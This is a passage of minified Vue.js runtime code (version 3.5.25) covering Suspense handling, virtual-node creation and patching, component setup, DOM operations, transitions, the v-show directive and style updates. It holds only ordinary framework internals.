        },
        It = {
            p: m,
            um: le,
            m: se,
            r: dt,
            mt: L,
            mc: v,
            pc: B,
            pbc: x,
            n: Ct,
            o: e
        };
    let Mr, wn;
    return t && ([Mr, wn] = t(It)), {
        render: sn,
        hydrate: Mr,
        createApp: m6(sn, Mr)
    }
}

function $l({
    type: e,
    props: t
}, n) {
    return n === "svg" && e === "foreignObject" || n === "mathml" && e === "annotation-xml" && t && t.encoding && t.encoding.includes("html") ? void 0 : n
}

function kr({
    effect: e,
    job: t
}, n) {
    n ? (e.flags |= 32, t.flags |= 4) : (e.flags &= -33, t.flags &= -5)
}

function f2(e, t) {
    return (!e || e && !e.pendingBranch) && t && !t.persisted
}

function K0(e, t, n = !1) {
    const r = e.children,
        s = t.children;
    if (K(r) && K(s))
        for (let i = 0; i < r.length; i++) {
            const o = r[i];
            let a = s[i];
            a.shapeFlag & 1 && !a.dynamicChildren && ((a.patchFlag <= 0 || a.patchFlag === 32) && (a = s[i] = fr(s[i]), a.el = o.el), !n && a.patchFlag !== -2 && K0(o, a)), a.type === mr && a.patchFlag !== -1 && (a.el = o.el), a.type === Pe && !a.el && (a.el = o.el)
        }
}

function M6(e) {
    const t = e.slice(),
        n = [0];
    let r, s, i, o, a;
    const c = e.length;
    for (r = 0; r < c; r++) {
        const u = e[r];
        if (u !== 0) {
            if (s = n[n.length - 1], e[s] < u) {
                t[r] = s, n.push(r);
                continue
            }
            for (i = 0, o = n.length - 1; i < o;) a = i + o >> 1, e[n[a]] < u ? i = a + 1 : o = a;
            u < e[n[i]] && (i > 0 && (t[r] = n[i - 1]), n[i] = r)
        }
    }
    for (i = n.length, o = n[i - 1]; i-- > 0;) n[i] = o, o = t[o];
    return n
}

function d2(e) {
    const t = e.subTree.component;
    if (t) return t.asyncDep && !t.asyncResolved ? t : d2(t)
}

function Wa(e) {
    if (e)
        for (let t = 0; t < e.length; t++) e[t].flags |= 8
}
const Xa = e => e.__isSuspense;
let Su = 0;
const k6 = {
        name: "Suspense",
        __isSuspense: !0,
        process(e, t, n, r, s, i, o, a, c, u) {
            if (e == null) L6(t, n, r, s, i, o, a, c, u);
            else {
                if (i && i.deps > 0 && !e.suspense.isInFallback) {
                    t.suspense = e.suspense, t.suspense.vnode = t, t.el = e.el;
                    return
                }
                $6(e, t, n, r, s, o, a, c, u)
            }
        },
        hydrate: D6,
        normalize: F6
    },
    B6 = k6;

function Yi(e, t) {
    const n = e.props && e.props[t];
    te(n) && n()
}

function L6(e, t, n, r, s, i, o, a, c) {
    const {
        p: u,
        o: {
            createElement: l
        }
    } = c, f = l("div"), d = e.suspense = h2(e, s, r, t, f, n, i, o, a, c);
    u(null, d.pendingBranch = e.ssContent, f, null, r, d, i, o), d.deps > 0 ? (Yi(e, "onPending"), Yi(e, "onFallback"), u(null, e.ssFallback, t, n, r, null, i, o), Ms(d, e.ssFallback)) : d.resolve(!1, !0)
}

function $6(e, t, n, r, s, i, o, a, {
    p: c,
    um: u,
    o: {
        createElement: l
    }
}) {
    const f = t.suspense = e.suspense;
    f.vnode = t, t.el = e.el;
    const d = t.ssContent,
        h = t.ssFallback,
        {
            activeBranch: b,
            pendingBranch: m,
            isInFallback: _,
            isHydrating: E
        } = f;
    if (m) f.pendingBranch = d, Xt(m, d) ? (c(m, d, f.hiddenContainer, null, s, f, i, o, a), f.deps <= 0 ? f.resolve() : _ && (E || (c(b, h, n, r, s, null, i, o, a), Ms(f, h)))) : (f.pendingId = Su++, E ? (f.isHydrating = !1, f.activeBranch = m) : u(m, s, f), f.deps = 0, f.effects.length = 0, f.hiddenContainer = l("div"), _ ? (c(null, d, f.hiddenContainer, null, s, f, i, o, a), f.deps <= 0 ? f.resolve() : (c(b, h, n, r, s, null, i, o, a), Ms(f, h))) : b && Xt(b, d) ? (c(b, d, n, r, s, f, i, o, a), f.resolve(!0)) : (c(null, d, f.hiddenContainer, null, s, f, i, o, a), f.deps <= 0 && f.resolve()));
    else if (b && Xt(b, d)) c(b, d, n, r, s, f, i, o, a), Ms(f, d);
    else if (Yi(t, "onPending"), f.pendingBranch = d, d.shapeFlag & 512 ? f.pendingId = d.component.suspenseId : f.pendingId = Su++, c(null, d, f.hiddenContainer, null, s, f, i, o, a), f.deps <= 0) f.resolve();
    else {
        const {
            timeout: S,
            pendingId: g
        } = f;
        S > 0 ? setTimeout(() => {
            f.pendingId === g && f.fallback(h)
        }, S) : S === 0 && f.fallback(h)
    }
}

function h2(e, t, n, r, s, i, o, a, c, u, l = !1) {
    const {
        p: f,
        m: d,
        um: h,
        n: b,
        o: {
            parentNode: m,
            remove: _
        }
    } = u;
    let E;
    const S = U6(e);
    S && t && t.pendingBranch && (E = t.pendingId, t.deps++);
    const g = e.props ? ji(e.props.timeout) : void 0,
        p = i,
        w = {
            vnode: e,
            parent: t,
            parentComponent: n,
            namespace: o,
            container: r,
            hiddenContainer: s,
            deps: 0,
            pendingId: Su++,
            timeout: typeof g == "number" ? g : -1,
            activeBranch: null,
            pendingBranch: null,
            isInFallback: !l,
            isHydrating: l,
            isUnmounted: !1,
            effects: [],
            resolve(A = !1, N = !1) {
                const {
                    vnode: v,
                    activeBranch: y,
                    pendingBranch: x,
                    pendingId: I,
                    effects: T,
                    parentComponent: O,
                    container: L,
                    isInFallback: k
                } = w;
                let R = !1;
                w.isHydrating ? w.isHydrating = !1 : A || (R = y && x.transition && x.transition.mode === "out-in", R && (y.transition.afterLeave = () => {
                    I === w.pendingId && (d(x, L, i === p ? b(y) : i, 0), Wi(T), k && v.ssFallback && (v.ssFallback.el = null))
                }), y && (m(y.el) === L && (i = b(y)), h(y, O, w, !0), !R && k && v.ssFallback && Re(() => v.ssFallback.el = null, w)), R || d(x, L, i, 0)), Ms(w, x), w.pendingBranch = null, w.isInFallback = !1;
                let D = w.parent,
                    B = !1;
                for (; D;) {
                    if (D.pendingBranch) {
                        D.effects.push(...T), B = !0;
                        break
                    }
                    D = D.parent
                }!B && !R && Wi(T), w.effects = [], S && t && t.pendingBranch && E === t.pendingId && (t.deps--, t.deps === 0 && !N && t.resolve()), Yi(v, "onResolve")
            },
            fallback(A) {
                if (!w.pendingBranch) return;
                const {
                    vnode: N,
                    activeBranch: v,
                    parentComponent: y,
                    container: x,
                    namespace: I
                } = w;
                Yi(N, "onFallback");
                const T = b(v),
                    O = () => {
                        w.isInFallback && (f(null, A, x, T, y, null, I, a, c), Ms(w, A))
                    },
                    L = A.transition && A.transition.mode === "out-in";
                L && (v.transition.afterLeave = O), w.isInFallback = !0, h(v, y, null, !0), L || O()
            },
            move(A, N, v) {
                w.activeBranch && d(w.activeBranch, A, N, v), w.container = A
            },
            next() {
                return w.activeBranch && b(w.activeBranch)
            },
            registerDep(A, N, v) {
                const y = !!w.pendingBranch;
                y && w.deps++;
                const x = A.vnode.el;
                A.asyncDep.catch(I => {
                    ds(I, A, 0)
                }).then(I => {
                    if (A.isUnmounted || w.isUnmounted || w.pendingId !== A.suspenseId) return;
                    A.asyncResolved = !0;
                    const {
                        vnode: T
                    } = A;
                    Au(A, I, !1), x && (T.el = x);
                    const O = !x && A.subTree.el;
                    N(A, T, m(x || A.subTree.el), x ? null : b(A.subTree), w, o, v), O && (T.placeholder = null, _(O)), Vc(A, T.el), y && --w.deps === 0 && w.resolve()
                })
            },
            unmount(A, N) {
                w.isUnmounted = !0, w.activeBranch && h(w.activeBranch, n, A, N), w.pendingBranch && h(w.pendingBranch, n, A, N)
            }
        };
    return w
}

function D6(e, t, n, r, s, i, o, a, c) {
    const u = t.suspense = h2(t, r, n, e.parentNode, document.createElement("div"), null, s, i, o, a, !0),
        l = c(e, u.pendingBranch = t.ssContent, n, u, i, o);
    return u.deps === 0 && u.resolve(!1, !0), l
}

function F6(e) {
    const {
        shapeFlag: t,
        children: n
    } = e, r = t & 32;
    e.ssContent = Gd(r ? n.default : n), e.ssFallback = r ? Gd(n.fallback) : Te(Pe)
}

function Gd(e) {
    let t;
    if (te(e)) {
        const n = Jr && e._c;
        n && (e._d = !1, Ue()), e = e(), n && (e._d = !0, t = rt, m2())
    }
    return K(e) && (e = v6(e)), e = xt(e), t && !e.dynamicChildren && (e.dynamicChildren = t.filter(n => n !== e)), e
}

function p2(e, t) {
    t && t.pendingBranch ? K(e) ? t.effects.push(...e) : t.effects.push(e) : Wi(e)
}

function Ms(e, t) {
    e.activeBranch = t;
    const {
        vnode: n,
        parentComponent: r
    } = e;
    let s = t.el;
    for (; !s && t.component;) t = t.component.subTree, s = t.el;
    n.el = s, r && r.subTree === n && (r.vnode.el = s, Vc(r, s))
}

function U6(e) {
    const t = e.props && e.props.suspensible;
    return t != null && t !== !1
}
const Ne = Symbol.for("v-fgt"),
    mr = Symbol.for("v-txt"),
    Pe = Symbol.for("v-cmt"),
    Wr = Symbol.for("v-stc"),
    Ui = [];
let rt = null;

function Ue(e = !1) {
    Ui.push(rt = e ? null : [])
}

function m2() {
    Ui.pop(), rt = Ui[Ui.length - 1] || null
}
let Jr = 1;

function Ji(e, t = !1) {
    Jr += e, e < 0 && rt && t && (rt.hasOnce = !0)
}

function b2(e) {
    return e.dynamicChildren = Jr > 0 ? rt || Vr : null, m2(), Jr > 0 && rt && rt.push(e), e
}

function pt(e, t, n, r, s, i) {
    return b2(z(e, t, n, r, s, i, !0))
}

function Ka(e, t, n, r, s) {
    return b2(Te(e, t, n, r, s, !0))
}

function Gn(e) {
    return e ? e.__v_isVNode === !0 : !1
}

function Xt(e, t) {
    return e.type === t.type && e.key === t.key
}

function V6(e) {}
const g2 = ({
        key: e
    }) => e ?? null,
    Na = ({
        ref: e,
        ref_key: t,
        ref_for: n
    }) => (typeof e == "number" && (e = "" + e), e != null ? re(e) || ke(e) || te(e) ? {
        i: Ge,
        r: e,
        k: t,
        f: !!n
    } : e : null);

function z(e, t = null, n = null, r = 0, s = null, i = e === Ne ? 0 : 1, o = !1, a = !1) {
    const c = {
        __v_isVNode: !0,
        __v_skip: !0,
        type: e,
        props: t,
        key: t && g2(t),
        ref: t && Na(t),
        scopeId: kc,
        slotScopeIds: null,
        children: n,
        component: null,
        suspense: null,
        ssContent: null,
        ssFallback: null,
        dirs: null,
        transition: null,
        el: null,
        anchor: null,
        target: null,
        targetStart: null,
        targetAnchor: null,
        staticCount: 0,
        shapeFlag: i,
        patchFlag: r,
        dynamicProps: s,
        dynamicChildren: null,
        appContext: null,
        ctx: Ge
    };
    return a ? (Z0(c, n), i & 128 && e.normalize(c)) : n && (c.shapeFlag |= re(n) ? 8 : 16), Jr > 0 && !o && rt && (c.patchFlag > 0 || i & 6) && c.patchFlag !== 32 && rt.push(c), c
}
const Te = H6;

function H6(e, t = null, n = null, r = 0, s = null, i = !1) {
    if ((!e || e === H1) && (e = Pe), Gn(e)) {
        const a = mn(e, t, !0);
        return n && Z0(a, n), Jr > 0 && !i && rt && (a.shapeFlag & 6 ? rt[rt.indexOf(e)] = a : rt.push(a)), a.patchFlag = -2, a
    }
    if (K6(e) && (e = e.__vccOpts), t) {
        t = x2(t);
        let {
            class: a,
            style: c
        } = t;
        a && !re(a) && (t.class = fs(a)), me(c) && ($o(c) && !K(c) && (c = ae({}, c)), t.style = ii(c))
    }
    const o = re(e) ? 1 : Xa(e) ? 128 : I1(e) ? 64 : me(e) ? 4 : te(e) ? 2 : 0;
    return z(e, t, n, r, s, o, i, !0)
}

function x2(e) {
    return e ? $o(e) || n2(e) ? ae({}, e) : e : null
}

function mn(e, t, n = !1, r = !1) {
    const {
        props: s,
        ref: i,
        patchFlag: o,
        children: a,
        transition: c
    } = e, u = t ? _2(s || {}, t) : s, l = {
        __v_isVNode: !0,
        __v_skip: !0,
        type: e.type,
        props: u,
        key: u && g2(u),
        ref: t && t.ref ? n && i ? K(i) ? i.concat(Na(t)) : [i, Na(t)] : Na(t) : i,
        scopeId: e.scopeId,
        slotScopeIds: e.slotScopeIds,
        children: a,
        target: e.target,
        targetStart: e.targetStart,
        targetAnchor: e.targetAnchor,
        staticCount: e.staticCount,
        shapeFlag: e.shapeFlag,
        patchFlag: t && e.type !== Ne ? o === -1 ? 16 : o | 16 : o,
        dynamicProps: e.dynamicProps,
        dynamicChildren: e.dynamicChildren,
        appContext: e.appContext,
        dirs: e.dirs,
        transition: c,
        component: e.component,
        suspense: e.suspense,
        ssContent: e.ssContent && mn(e.ssContent),
        ssFallback: e.ssFallback && mn(e.ssFallback),
        placeholder: e.placeholder,
        el: e.el,
        anchor: e.anchor,
        ctx: e.ctx,
        ce: e.ce
    };
    return c && r && qn(l, c.clone(l)), l
}

function Nn(e = " ", t = 0) {
    return Te(mr, null, e, t)
}

function y2(e, t) {
    const n = Te(Wr, null, e);
    return n.staticCount = t, n
}

function w2(e = "", t = !1) {
    return t ? (Ue(), Ka(Pe, null, e)) : Te(Pe, null, e)
}

function xt(e) {
    return e == null || typeof e == "boolean" ? Te(Pe) : K(e) ? Te(Ne, null, e.slice()) : Gn(e) ? fr(e) : Te(mr, null, String(e))
}

function fr(e) {
    return e.el === null && e.patchFlag !== -1 || e.memo ? e : mn(e)
}

function Z0(e, t) {
    let n = 0;
    const {
        shapeFlag: r
    } = e;
    if (t == null) t = null;
    else if (K(t)) n = 16;
    else if (typeof t == "object")
        if (r & 65) {
            const s = t.default;
            s && (s._c && (s._d = !1), Z0(e, s()), s._c && (s._d = !0));
            return
        } else {
            n = 32;
            const s = t._;
            !s && !n2(t) ? t._ctx = Ge : s === 3 && Ge && (Ge.slots._ === 1 ? t._ = 1 : (t._ = 2, e.patchFlag |= 1024))
        }
    else te(t) ? (t = {
        default: t,
        _ctx: Ge
    }, n = 32) : (t = String(t), r & 64 ? (n = 16, t = [Nn(t)]) : n = 8);
    e.children = t, e.shapeFlag |= n
}

function _2(...e) {
    const t = {};
    for (let n = 0; n < e.length; n++) {
        const r = e[n];
        for (const s in r)
            if (s === "class") t.class !== r.class && (t.class = fs([t.class, r.class]));
            else if (s === "style") t.style = ii([t.style, r.style]);
        else if (vr(s)) {
            const i = t[s],
                o = r[s];
            o && i !== o && !(K(i) && i.includes(o)) && (t[s] = i ? [].concat(i, o) : o)
        } else s !== "" && (t[s] = r[s])
    }
    return t
}

function bt(e, t, n, r = null) {
    jt(e, t, 7, [n, r])
}
const j6 = G1();
let z6 = 0;

function E2(e, t, n) {
    const r = e.type,
        s = (t ? t.appContext : e.appContext) || j6,
        i = {
            uid: z6++,
            vnode: e,
            type: r,
            parent: t,
            appContext: s,
            root: null,
            next: null,
            subTree: null,
            effect: null,
            update: null,
            job: null,
            scope: new O0(!0),
            render: null,
            proxy: null,
            exposed: null,
            exposeProxy: null,
            withProxy: null,
            provides: t ? t.provides : Object.create(s.provides),
            ids: t ? t.ids : ["", 0, 0],
            accessCache: null,
            renderCache: [],
            components: null,
            directives: null,
            propsOptions: s2(r, s),
            emitsOptions: Q1(r, s),
            emit: null,
            emitted: null,
            propsDefaults: ue,
            inheritAttrs: r.inheritAttrs,
            ctx: ue,
            data: ue,
            props: ue,
            attrs: ue,
            slots: ue,
            refs: ue,
            setupState: ue,
            setupContext: null,
            suspense: n,
            suspenseId: n ? n.pendingId : 0,
            asyncDep: null,
            asyncResolved: !1,
            isMounted: !1,
            isUnmounted: !1,
            isDeactivated: !1,
            bc: null,
            c: null,
            bm: null,
            m: null,
            bu: null,
            u: null,
            um: null,
            bum: null,
            da: null,
            a: null,
            rtg: null,
            rtc: null,
            ec: null,
            sp: null
        };
    return i.ctx = {
        _: i
    }, i.root = t ? t.root : i, i.emit = _6.bind(null, i), e.ce && e.ce(i), i
}
let qe = null;
const vt = () => qe || Ge;
let Za, Cu;
{
    const e = Bo(),
        t = (n, r) => {
            let s;
            return (s = e[n]) || (s = e[n] = []), s.push(r), i => {
                s.length > 1 ? s.forEach(o => o(i)) : s[0](i)
            }
        };
    Za = t("__VUE_INSTANCE_SETTERS__", n => qe = n), Cu = t("__VUE_SSR_SETTERS__", n => Vs = n)
}
const Qr = e => {
        const t = qe;
        return Za(e), e.scope.on(), () => {
            e.scope.off(), Za(t)
        }
    },
    Iu = () => {
        qe && qe.scope.off(), Za(null)
    };

function v2(e) {
    return e.vnode.shapeFlag & 4
}
let Vs = !1;

function T2(e, t = !1, n = !1) {
    t && Cu(t);
    const {
        props: r,
        children: s
    } = e.vnode, i = v2(e);
    I6(e, r, i, t), O6(e, s, n || t);
    const o = i ? q6(e, t) : void 0;
    return t && Cu(!1), o
}

function q6(e, t) {
    const n = e.type;
    e.accessCache = Object.create(null), e.proxy = new Proxy(e.ctx, _u);
    const {
        setup: r
    } = n;
    if (r) {
        jn();
        const s = e.setupContext = r.length > 1 ? C2(e) : null,
            i = Qr(e),
            o = oi(r, e, 0, [e.props, s]),
            a = Cc(o);
        if (zn(), i(), (a || e.sp) && !pr(e) && V0(e), a) {
            if (o.then(Iu, Iu), t) return o.then(c => {
                Au(e, c, t)
            }).catch(c => {
                ds(c, e, 0)
            });
            e.asyncDep = o
        } else Au(e, o, t)
    } else S2(e, t)
}

function Au(e, t, n) {
    te(t) ? e.type.__ssrInlineRender ? e.ssrRender = t : e.render = t : me(t) && (e.setupState = B0(t)), S2(e, n)
}
let Ya, Nu;

function G6(e) {
    Ya = e, Nu = t => {
        t.render._rc && (t.withProxy = new Proxy(t.ctx, K5))
    }
}
const W6 = () => !Ya;

function S2(e, t, n) {
    const r = e.type;
    if (!e.render) {
        if (!t && Ya && !r.render) {
            const s = r.template || G0(e).template;
            if (s) {
                const {
                    isCustomElement: i,
                    compilerOptions: o
                } = e.appContext.config, {
                    delimiters: a,
                    compilerOptions: c
                } = r, u = ae(ae({
                    isCustomElement: i,
                    delimiters: a
                }, o), c);
                r.render = Ya(s, u)
            }
        }
        e.render = r.render || He, Nu && Nu(e)
    } {
        const s = Qr(e);
        jn();
        try {
            l6(e)
        } finally {
            zn(), s()
        }
    }
}
const X6 = {
    get(e, t) {
        return tt(e, "get", ""), e[t]
    }
};

function C2(e) {
    const t = n => {
        e.exposed = n || {}
    };
    return {
        attrs: new Proxy(e.attrs, X6),
        slots: e.slots,
        emit: e.emit,
        expose: t
    }
}

function Ho(e) {
    return e.exposed ? e.exposeProxy || (e.exposeProxy = new Proxy(B0(m1(e.exposed)), {
        get(t, n) {
            if (n in t) return t[n];
            if (n in Di) return Di[n](e)
        },
        has(t, n) {
            return n in t || n in Di
        }
    })) : e.proxy
}

function Pu(e, t = !0) {
    return te(e) ? e.displayName || e.name : e.name || t && e.__name
}

function K6(e) {
    return te(e) && "__vccOpts" in e
}
const I2 = (e, t) => a5(e, t, Vs);

function A2(e, t, n) {
    try {
        Ji(-1);
        const r = arguments.length;
        return r === 2 ? me(t) && !K(t) ? Gn(t) ? Te(e, null, [t]) : Te(e, t) : Te(e, null, t) : (r > 3 ? n = Array.prototype.slice.call(arguments, 2) : r === 3 && Gn(n) && (n = [n]), Te(e, t, n))
    } finally {
        Ji(1)
    }
}

function Z6() {}

function Y6(e, t, n, r) {
    const s = n[r];
    if (s && N2(s, e)) return s;
    const i = t();
    return i.memo = e.slice(), i.cacheIndex = r, n[r] = i
}

function N2(e, t) {
    const n = e.memo;
    if (n.length != t.length) return !1;
    for (let r = 0; r < n.length; r++)
        if (et(n[r], t[r])) return !1;
    return Jr > 0 && rt && rt.push(e), !0
}
const P2 = "3.5.25",
    J6 = He,
    Q6 = b5,
    ew = vs,
    tw = S1,
    nw = {
        createComponentInstance: E2,
        setupComponent: T2,
        renderComponentRoot: Aa,
        setCurrentRenderingInstance: Ki,
        isVNode: Gn,
        normalizeVNode: xt,
        getComponentPublicInstance: Ho,
        ensureValidVNode: q0,
        pushWarningContext: d5,
        popWarningContext: h5
    },
    rw = nw,
    sw = null,
    iw = null,
    ow = null;
let Ou;
const Wd = typeof window < "u" && window.trustedTypes;
if (Wd) try {
    Ou = Wd.createPolicy("vue", {
        createHTML: e => e
    })
} catch {}
const O2 = Ou ? e => Ou.createHTML(e) : e => e,
    aw = "http://www.w3.org/2000/svg",
    cw = "http://www.w3.org/1998/Math/MathML",
    In = typeof document < "u" ? document : null,
    Xd = In && In.createElement("template"),
    R2 = {
        insert: (e, t, n) => {
            t.insertBefore(e, n || null)
        },
        remove: e => {
            const t = e.parentNode;
            t && t.removeChild(e)
        },
        createElement: (e, t, n, r) => {
            const s = t === "svg" ? In.createElementNS(aw, e) : t === "mathml" ? In.createElementNS(cw, e) : n ? In.createElement(e, {
                is: n
            }) : In.createElement(e);
            return e === "select" && r && r.multiple != null && s.setAttribute("multiple", r.multiple), s
        },
        createText: e => In.createTextNode(e),
        createComment: e => In.createComment(e),
        setText: (e, t) => {
            e.nodeValue = t
        },
        setElementText: (e, t) => {
            e.textContent = t
        },
        parentNode: e => e.parentNode,
        nextSibling: e => e.nextSibling,
        querySelector: e => In.querySelector(e),
        setScopeId(e, t) {
            e.setAttribute(t, "")
        },
        insertStaticContent(e, t, n, r, s, i) {
            const o = n ? n.previousSibling : t.lastChild;
            if (s && (s === i || s.nextSibling))
                for (; t.insertBefore(s.cloneNode(!0), n), !(s === i || !(s = s.nextSibling)););
            else {
                Xd.innerHTML = O2(r === "svg" ? `<svg>${e}</svg>` : r === "mathml" ? `<math>${e}</math>` : e);
                const a = Xd.content;
                if (r === "svg" || r === "mathml") {
                    const c = a.firstChild;
                    for (; c.firstChild;) a.appendChild(c.firstChild);
                    a.removeChild(c)
                }
                t.insertBefore(a, n)
            }
            return [o ? o.nextSibling : t.firstChild, n ? n.previousSibling : t.lastChild]
        }
    },
    rr = "transition",
    wi = "animation",
    Hs = Symbol("_vtc"),
    M2 = {
        name: String,
        type: String,
        css: {
            type: Boolean,
            default: !0
        },
        duration: [String, Number, Object],
        enterFromClass: String,
        enterActiveClass: String,
        enterToClass: String,
        appearFromClass: String,
        appearActiveClass: String,
        appearToClass: String,
        leaveFromClass: String,
        leaveActiveClass: String,
        leaveToClass: String
    },
    k2 = ae({}, F0, M2),
    lw = e => (e.displayName = "Transition", e.props = k2, e),
    uw = lw((e, {
        slots: t
    }) => A2(R1, B2(e), t)),
    Br = (e, t = []) => {
        K(e) ? e.forEach(n => n(...t)) : e && e(...t)
    },
    Kd = e => e ? K(e) ? e.some(t => t.length > 1) : e.length > 1 : !1;

function B2(e) {
    const t = {};
    for (const T in e) T in M2 || (t[T] = e[T]);
    if (e.css === !1) return t;
    const {
        name: n = "v",
        type: r,
        duration: s,
        enterFromClass: i = `${n}-enter-from`,
        enterActiveClass: o = `${n}-enter-active`,
        enterToClass: a = `${n}-enter-to`,
        appearFromClass: c = i,
        appearActiveClass: u = o,
        appearToClass: l = a,
        leaveFromClass: f = `${n}-leave-from`,
        leaveActiveClass: d = `${n}-leave-active`,
        leaveToClass: h = `${n}-leave-to`
    } = e, b = fw(s), m = b && b[0], _ = b && b[1], {
        onBeforeEnter: E,
        onEnter: S,
        onEnterCancelled: g,
        onLeave: p,
        onLeaveCancelled: w,
        onBeforeAppear: A = E,
        onAppear: N = S,
        onAppearCancelled: v = g
    } = t, y = (T, O, L, k) => {
        T._enterCancelled = k, ar(T, O ? l : a), ar(T, O ? u : o), L && L()
    }, x = (T, O) => {
        T._isLeaving = !1, ar(T, f), ar(T, h), ar(T, d), O && O()
    }, I = T => (O, L) => {
        const k = T ? N : S,
            R = () => y(O, T, L);
        Br(k, [O, R]), Zd(() => {
            ar(O, T ? c : i), ln(O, T ? l : a), Kd(k) || Yd(O, r, m, R)
        })
    };
    return ae(t, {
        onBeforeEnter(T) {
            Br(E, [T]), ln(T, i), ln(T, o)
        },
        onBeforeAppear(T) {
            Br(A, [T]), ln(T, c), ln(T, u)
        },
        onEnter: I(!1),
        onAppear: I(!0),
        onLeave(T, O) {
            T._isLeaving = !0;
            const L = () => x(T, O);
            ln(T, f), T._enterCancelled ? (ln(T, d), Ru(T)) : (Ru(T), ln(T, d)), Zd(() => {
                T._isLeaving && (ar(T, f), ln(T, h), Kd(p) || Yd(T, r, _, L))
            }), Br(p, [T, L])
        },
        onEnterCancelled(T) {
            y(T, !1, void 0, !0), Br(g, [T])
        },
        onAppearCancelled(T) {
            y(T, !0, void 0, !0), Br(v, [T])
        },
        onLeaveCancelled(T) {
            x(T), Br(w, [T])
        }
    })
}

function fw(e) {
    if (e == null) return null;
    if (me(e)) return [Dl(e.enter), Dl(e.leave)];
    {
        const t = Dl(e);
        return [t, t]
    }
}

function Dl(e) {
    return ji(e)
}

function ln(e, t) {
    t.split(/\s+/).forEach(n => n && e.classList.add(n)), (e[Hs] || (e[Hs] = new Set)).add(t)
}

function ar(e, t) {
    t.split(/\s+/).forEach(r => r && e.classList.remove(r));
    const n = e[Hs];
    n && (n.delete(t), n.size || (e[Hs] = void 0))
}

function Zd(e) {
    requestAnimationFrame(() => {
        requestAnimationFrame(e)
    })
}
let dw = 0;

function Yd(e, t, n, r) {
    const s = e._endId = ++dw,
        i = () => {
            s === e._endId && r()
        };
    if (n != null) return setTimeout(i, n);
    const {
        type: o,
        timeout: a,
        propCount: c
    } = L2(e, t);
    if (!o) return r();
    const u = o + "end";
    let l = 0;
    const f = () => {
            e.removeEventListener(u, d), i()
        },
        d = h => {
            h.target === e && ++l >= c && f()
        };
    setTimeout(() => {
        l < c && f()
    }, a + 1), e.addEventListener(u, d)
}

function L2(e, t) {
    const n = window.getComputedStyle(e),
        r = b => (n[b] || "").split(", "),
        s = r(`${rr}Delay`),
        i = r(`${rr}Duration`),
        o = Jd(s, i),
        a = r(`${wi}Delay`),
        c = r(`${wi}Duration`),
        u = Jd(a, c);
    let l = null,
        f = 0,
        d = 0;
    t === rr ? o > 0 && (l = rr, f = o, d = i.length) : t === wi ? u > 0 && (l = wi, f = u, d = c.length) : (f = Math.max(o, u), l = f > 0 ? o > u ? rr : wi : null, d = l ? l === rr ? i.length : c.length : 0);
    const h = l === rr && /\b(?:transform|all)(?:,|$)/.test(r(`${rr}Property`).toString());
    return {
        type: l,
        timeout: f,
        propCount: d,
        hasTransform: h
    }
}

function Jd(e, t) {
    for (; e.length < t.length;) e = e.concat(e);
    return Math.max(...t.map((n, r) => Qd(n) + Qd(e[r])))
}

function Qd(e) {
    return e === "auto" ? 0 : Number(e.slice(0, -1).replace(",", ".")) * 1e3
}

function Ru(e) {
    return (e ? e.ownerDocument : document).body.offsetHeight
}

function hw(e, t, n) {
    const r = e[Hs];
    r && (t = (t ? [t, ...r] : [...r]).join(" ")), t == null ? e.removeAttribute("class") : n ? e.setAttribute("class", t) : e.className = t
}
const Ja = Symbol("_vod"),
    $2 = Symbol("_vsh"),
    D2 = {
        name: "show",
        beforeMount(e, {
            value: t
        }, {
            transition: n
        }) {
            e[Ja] = e.style.display === "none" ? "" : e.style.display, n && t ? n.beforeEnter(e) : _i(e, t)
        },
        mounted(e, {
            value: t
        }, {
            transition: n
        }) {
            n && t && n.enter(e)
        },
        updated(e, {
            value: t,
            oldValue: n
        }, {
            transition: r
        }) {
            !t != !n && (r ? t ? (r.beforeEnter(e), _i(e, !0), r.enter(e)) : r.leave(e, () => {
                _i(e, !1)
            }) : _i(e, t))
        },
        beforeUnmount(e, {
            value: t
        }) {
            _i(e, t)
        }
    };

function _i(e, t) {
    e.style.display = t ? e[Ja] : "none", e[$2] = !t
}

function pw() {
    D2.getSSRProps = ({
        value: e
    }) => {
        if (!e) return {
            style: {
                display: "none"
            }
        }
    }
}
const F2 = Symbol("");

function mw(e) {
    const t = vt();
    if (!t) return;
    const n = t.ut = (s = e(t.proxy)) => {
            Array.from(document.querySelectorAll(`[data-v-owner="${t.uid}"]`)).forEach(i => Qa(i, s))
        },
        r = () => {
            const s = e(t.proxy);
            t.ce ? Qa(t.ce, s) : Mu(t.subTree, s), n(s)
        };
    H0(() => {
        Wi(r)
    }), Uo(() => {
        Rs(r, He, {
            flush: "post"
        });
        const s = new MutationObserver(r);
        s.observe(t.subTree.el.parentNode, {
            childList: !0
        }), Fc(() => s.disconnect())
    })
}

function Mu(e, t) {
    if (e.shapeFlag & 128) {
        const n = e.suspense;
        e = n.activeBranch, n.pendingBranch && !n.isHydrating && n.effects.push(() => {
            Mu(n.activeBranch, t)
        })
    }
    for (; e.component;) e = e.component.subTree;
    if (e.shapeFlag & 1 && e.el) Qa(e.el, t);
    else if (e.type === Ne) e.children.forEach(n => Mu(n, t));
    else if (e.type === Wr) {
        let {
            el: n,
            anchor: r
        } = e;
        for (; n && (Qa(n, t), n !== r);) n = n.nextSibling
    }
}

function Qa(e, t) {
    if (e.nodeType === 1) {
        const n = e.style;
        let r = "";
        for (const s in t) {
            const i = Yp(t[s]);
            n.setProperty(`--${s}`, i), r += `--${s}: ${i};`
        }
        n[F2] = r
    }
}
const bw = /(?:^|;)\s*display\s*:/;

function gw(e, t, n) {
    const r = e.style,
        s = re(n);
    let i = !1;
    if (n && !s) {
        if (t)
            if (re(t))
                for (const o of t.split(";")) {
                    const a = o.slice(0, o.indexOf(":")).trim();
                    n[a] == null && Pa(r, a, "")
                } else
                    for (const o in t) n[o] == null && Pa(r, o, "");
        for (const o in n) o === "display" && (i = !0), Pa(r, o, n[o])
    } else if (s) {
        if (t !== n) {
            const o = r[F2];
            o && (n += ";" + o), r.cssText = n, i = bw.test(n)
        }
    } else t && e.removeAttribute("style");
    Ja in e && (e[Ja] = i ? r.display : "", e[$2] && (r.display = "none"))
}
const eh = /\s*!important$/;

function Pa(e, t, n) {
    if (K(n)) n.forEach(r => Pa(e, t, r));
    else if (n == null && (n = ""), t.startsWith("--")) e.setProperty(t, n);
    else {
        const r = xw(e, t);
        eh.test(n) ? e.setProperty(nt(r), n.replace(eh, ""), "important") : e[r] = n
    }
}
const th = ["Webkit", "Moz", "ms"],
    Fl = {};

function xw(e, t) {
    const n = Fl[t];
    if (n) return n;
    let r = _e(t);
    if (r !== "filter" && r in e) return Fl[t] = r;
